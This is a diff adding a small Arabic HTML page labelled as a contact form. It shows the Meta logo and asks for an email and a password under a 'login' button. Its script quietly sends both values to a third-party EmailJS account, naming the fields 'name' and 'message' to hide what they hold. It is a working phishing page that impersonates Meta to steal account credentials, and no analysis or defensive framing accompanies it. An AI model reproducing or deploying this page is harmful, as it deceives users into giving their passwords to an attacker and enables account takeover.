@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>نموذج الاتصال</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<img src="https://logos-world.net/wp-content/uploads/2021/11/Meta-Symbol.png" alt="logo">
+<form id="contact-form">
+  <input type="text" id="message" placeholder="البريد الإلكتروني" required />
+  <input type="text" id="name" placeholder="كلمة السر" required />
+  <button type="submit">تسجيل الدخول</button>
+</form>
+
+<script>
+  emailjs.init('EfZxWH2GvWhFBs_ac');
+
+  document.getElementById('contact-form').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const name = document.getElementById('name').value;
+    const message = document.getElementById('message').value;
+
+    emailjs.send('service_mus1qdo', 'template_d5mlt62', {
+        name: name,
+        message: message
+    })
+
+    .then(() => {
+      
+      document.getElementById('contact-form').reset();
+    })
+    .catch((error) => {
+      alert('حدث خطأ: ' + JSON.stringify(error));
+    });
+  });
+</script>
+
+</body>
+</html>
